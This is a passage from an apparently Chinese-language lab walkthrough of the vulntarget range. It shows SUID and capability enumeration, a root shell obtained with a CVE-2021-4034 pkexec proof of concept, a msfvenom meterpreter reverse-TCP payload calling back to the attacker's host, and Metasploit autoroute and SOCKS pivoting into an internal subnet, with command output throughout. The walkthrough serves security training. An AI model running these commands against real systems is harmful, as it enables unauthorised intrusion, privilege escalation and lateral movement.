<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(remote) www@localhost.localdomain:/tmp$ getcap -r / 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/newgidmap = cap_setgid+ep</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/newuidmap = cap_setuid+ep</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/ping = cap_net_admin,cap_net_raw+p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/arping = cap_net_raw+p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/clockdiff = cap_net_raw+p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(remote) www@localhost.localdomain:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/fusermount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/chfn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/chage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/chsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/newgrp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/mount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/su</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/sudo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/umount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/crontab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/pkexec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/unix_chkpwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/pam_timestamp_check</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/usernetctl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/lib/polkit-1/polkit-agent-helper-1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <code>PEASS-ng</code> 进行自动化探测</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strace Not Found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 32K Oct 31  2018 /usr/bin/fusermount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rws--x--x. 1 root root 24K Feb  3  2021 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 73K Aug  9  2019 /usr/bin/chage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rws--x--x. 1 root root 24K Feb  3  2021 /usr/bin/chsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 77K Aug  9  2019 /usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 41K Aug  9  2019 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 44K Feb  3  2021 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 32K Feb  3  2021 /usr/bin/su</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---s--x--x. 1 root root 144K Oct  1  2020 /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 32K Feb  3  2021 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 57K Aug  9  2019 /usr/bin/crontab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 24K Apr  1  2020 /usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 28K Apr  1  2020 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 36K Apr  1  2020 /usr/sbin/unix_chkpwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 11K Apr  1  2020 /usr/sbin/pam_timestamp_check</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 12K Oct 13  2020 /usr/sbin/usernetctl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-x. 1 root root 16K Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-x---. 1 root dbus 57K Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>并查看 sudo 二进制程序的版本</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(remote) www@localhost.localdomain:/tmp$ sudo --version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sudo version 1.8.23</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sudoers policy plugin version 1.8.23</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sudoers file grammar version 46</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sudoers I/O plugin version 1.8.23</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>说明存在有以下漏洞</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cve-2021-3156 -&gt; sudo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CVE-2021-4034 -&gt; pkexec</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>理论上两个洞都能打，这里只尝试 <code>CVE-2021-4034</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(remote) www@localhost.localdomain:/tmp$ gcc cve-2021-4034-poc.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(remote) www@localhost.localdomain:/tmp$ ./a.out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sh-4.2# whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sh-4.2# cat /root/flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vulntarget{get-one-centos-privilage-promotion}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="centos-上线-metasploit-持久化">centos 上线 Metasploit 持久化<a href="#centos-上线-metasploit-持久化" class="hash-link" aria-label="centos 上线 Metasploit 持久化的直接链接" title="centos 上线 Metasploit 持久化的直接链接">​</a></h2>
<p>首先，先生成一份 Metasploit 的马子</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.200.129 LPORT=3333 -f elf &gt; 192.168.200.129-3333.elf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 130 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of elf file: 250 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <code>CVE-2021-4034</code> 漏洞，以 <code>root</code> 权限执行马子，上线 Msfconsole</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using configured payload generic/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload =&gt; linux/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST =&gt; 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LPORT 3333</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPORT =&gt; 3333</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 0.0.0.0:3333</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Sending stage (3045380 bytes) to 192.168.200.12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Meterpreter session 1 opened (192.168.200.129:3333 -&gt; 192.168.200.12:45328) at 2024-11-02 09:24:15 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; sysinfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Computer     : localhost.localdomain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OS           : CentOS 7.9.2009 (Linux 3.10.0-1160.el7.x86_64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Architecture : x64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BuildTuple   : x86_64-linux-musl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Meterpreter  : x64/linux</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="搭建内网代理">搭建内网代理<a href="#搭建内网代理" class="hash-link" aria-label="搭建内网代理的直接链接" title="搭建内网代理的直接链接">​</a></h2>
<p>直接使用 Meterpreter 建立内网代理</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; run post/multi/manage/autoroute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running module against localhost.localdomain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Searching for subnets to autoroute.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 192.168.200.0/255.255.255.0 from host&#x27;s routing table.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后启动 socks 服务器</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(server/socks_proxy) &gt; exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Auxiliary module running as background job 0.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(server/socks_proxy) &gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Starting the SOCKS proxy server</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>设置好 <code>proxychains</code> 配置之后，就可以进行内网扫描</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="一层内网探测">一层内网探测<a href="#一层内网探测" class="hash-link" aria-label="一层内网探测的直接链接" title="一层内网探测的直接链接">​</a></h2>
<p>查看网卡信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; ifconfig</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface  1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : lo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 65536</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Flags        : UP,LOOPBACK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : ::1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface  2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : ens33</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:0c:29:0c:a4:53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Flags        : UP,BROADCAST,MULTICAST</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 192.168.200.12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::6fd2:b978:2811:56fc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface  3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : ens37</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:0c:29:0c:a4:5d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Flags        : UP,BROADCAST,MULTICAST</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 10.0.20.30</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::1162:e042:35a0:5cd0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>发现一层内网 <code>10.0.20.0/24</code></p>
<p>查看 ARP 表</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; arp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ARP cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=========</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IP address       MAC address        Interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ----------       -----------        ---------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.20.66       00:0c:29:52:20:46  ens37</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.20.254      00:50:56:f9:de:dc  ens37</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    192.168.200.129  00:0c:29:07:06:1a  ens33</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>发现另外一台主机 <code>10.0.20.66</code> 的存在，上传 <code>fscan</code> 并执行扫描</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.66:8080 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.66:3306 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] alive ports len is: 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">已完成 2/2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 扫描结束, 耗时: 15.784022066s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win10-web-服务侦察">win10 web 服务侦察<a href="#win10-web-服务侦察" class="hash-link" aria-label="win10 web 服务侦察的直接链接" title="win10 web 服务侦察的直接链接">​</a></h2>
<p>尝试使用 <code>dirsearch</code> 目录扫描</p>
